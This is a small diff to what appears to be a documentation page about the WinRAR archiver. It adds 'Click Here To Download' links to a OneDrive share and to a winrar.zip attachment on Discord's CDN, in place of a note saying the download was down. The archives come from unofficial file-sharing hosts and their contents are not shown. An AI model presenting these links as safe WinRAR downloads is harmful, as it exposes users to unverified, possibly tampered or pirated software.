@@ -24,7 +24,11 @@ WinRAR (a.k.a. RAR) is a shareware file archiver and data compression program cr
 {% endtab %}
 
 {% tab title="OneDrive" %}
-## Its down.
+## [Click Here To Download](https://1drv.ms/u/s!AkX2q12uku0fgfBw55o4a5eFrbS5PQ?e=nt1PI3)
+{% endtab %}
+
+{% tab title="Discord" %}
+## [Click Here To Download](https://cdn.discordapp.com/attachments/1113994556787146843/1150911979259703366/winrar.zip)
 {% endtab %}
 {% endtabs %}
 
